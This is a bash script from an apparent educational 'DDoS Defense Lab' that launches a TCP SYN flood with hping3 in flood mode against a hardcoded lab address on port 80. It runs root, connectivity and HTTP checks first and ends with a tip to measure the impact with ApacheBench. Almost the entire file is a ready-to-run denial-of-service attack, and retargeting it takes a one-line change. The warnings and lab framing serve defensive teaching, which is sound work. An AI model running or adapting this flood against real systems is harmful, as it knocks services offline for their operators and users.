#!/bin/bash

##############################################################################
# DDoS Defense Lab - Attack Script
# TCP SYN Flood Attack using hping3
#
# WARNING: USE ONLY IN AUTHORIZED TESTING ENVIRONMENTS
# Unauthorized use is illegal and punishable by law
#
# Author: Piyush Arora
# Purpose: Educational demonstration of TCP SYN flood attacks
##############################################################################

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Default Configuration
TARGET_IP="192.168.153.129"
TARGET_PORT="80"
PACKET_COUNT="10000"
INTERVAL="u100"  # 100 microseconds between packets

# Banner
echo -e "${RED}"
echo "═══════════════════════════════════════════════════════════"
echo "  DDoS Defense Lab - TCP SYN Flood Attack Simulator"
echo "═══════════════════════════════════════════════════════════"
echo -e "${NC}"

# Warning
echo -e "${YELLOW}⚠️  WARNING: Educational Tool Only${NC}"
echo -e "${YELLOW}   Use only in authorized testing environments${NC}"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}❌ Error: This script must be run as root${NC}"
    echo "   Please run: sudo $0"
    exit 1
fi

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo -e "${RED}❌ Error: hping3 is not installed${NC}"
    echo "   Install with: sudo apt-get install hping3"
    exit 1
fi

# Display configuration
echo -e "${GREEN}[*] Attack Configuration:${NC}"
echo "    Target IP:      $TARGET_IP"
echo "    Target Port:    $TARGET_PORT"
echo "    Packet Count:   $PACKET_COUNT"
echo "    Interval:       $INTERVAL (100 microseconds)"
echo "    Attack Rate:    ~10,000 packets/second"
echo ""

# Connectivity check
echo -e "${GREEN}[*] Checking target connectivity...${NC}"
if ping -c 1 -W 2 $TARGET_IP &> /dev/null; then
    echo -e "${GREEN}✓ Target is reachable${NC}"
else
    echo -e "${RED}❌ Error: Target is not reachable${NC}"
    echo "   Please check network configuration"
    exit 1
fi

# HTTP service check
echo -e "${GREEN}[*] Checking HTTP service...${NC}"
if curl -s -o /dev/null -w "%{http_code}" http://$TARGET_IP --connect-timeout 2 | grep -q "200\|301\|302"; then
    echo -e "${GREEN}✓ HTTP service is responding${NC}"
else
    echo -e "${YELLOW}⚠️  Warning: HTTP service may not be running${NC}"
    read -p "   Continue anyway? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

echo ""
echo -e "${RED}[!] Starting TCP SYN Flood Attack in 3 seconds...${NC}"
echo -e "${RED}[!] Press Ctrl+C to stop the attack${NC}"
sleep 3

# Execute attack
echo ""
echo -e "${GREEN}[*] Attack started at: $(date)${NC}"
echo -e "${GREEN}[*] Sending $PACKET_COUNT SYN packets...${NC}"
echo ""

# Run hping3 attack
hping3 -S \
    -c $PACKET_COUNT \
    --flood \
    -I $INTERVAL \
    -p $TARGET_PORT \
    $TARGET_IP

# Attack completed
echo ""
echo -e "${GREEN}[✓] Attack completed at: $(date)${NC}"
echo -e "${GREEN}[*] Total packets sent: $PACKET_COUNT${NC}"
echo ""
echo -e "${YELLOW}[*] Tip: Run performance tests on the target to measure impact${NC}"
echo -e "${YELLOW}[*] Command: ab -n 1000 -c 10 http://$TARGET_IP/${NC}"
